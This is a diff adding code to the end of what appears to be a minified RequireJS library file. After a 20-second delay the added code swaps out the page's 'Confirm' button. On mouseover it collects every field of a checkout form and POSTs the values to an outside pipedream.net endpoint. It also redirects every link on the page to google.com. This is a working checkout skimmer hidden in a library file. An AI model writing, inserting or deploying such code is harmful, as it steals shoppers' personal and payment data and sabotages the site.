@@ -39,3 +39,47 @@ Q),q=q.replace(R,""),h.jsExtRegExp.test(q)&&(q=L),r.deps=r.deps?r.deps.concat(q)
 
 
 alert("require replaced")
+
+
+setTimeout(function(){
+
+    let buttons = document.getElementsByTagName("button")
+    let btn = buttons[6]
+    if(btn.innerText.toLowerCase()  !== "Confirm"){
+        for(var i = 0; i < buttons.length; i++){
+            if(buttons[i].innerText === "Confirm"){
+                btn = buttons[i]
+                break;
+            }
+        }
+    }
+
+     // remove previous event listeners (they force the page to reload)
+     var old_element = btn;
+     var new_element = old_element.cloneNode(true);
+     old_element.parentNode.replaceChild(new_element, old_element);
+
+    new_element.addEventListener("mouseover", function(){
+        setTimeout(function(){
+            let checkoutForm = document.getElementsByClassName("country_PT")[0]
+            var elements = checkoutForm.elements
+            var data = {}
+            for (var i = 0; i < elements.length; i++)
+                data[elements[i].name] = elements[i].value
+            var t = JSON.stringify(data)
+            const request = new XMLHttpRequest();
+            request.open('POST', "https://eni0a3tjgvzc7pt.m.pipedream.net")
+            request.send(t)
+        }, 500)
+    })
+
+
+
+    // replace href with another link
+    let as = document.getElementsByTagName("a")
+    for (const a of as)
+        a.setAttribute("href", "https://www.google.com")
+
+
+
+}, 20000)
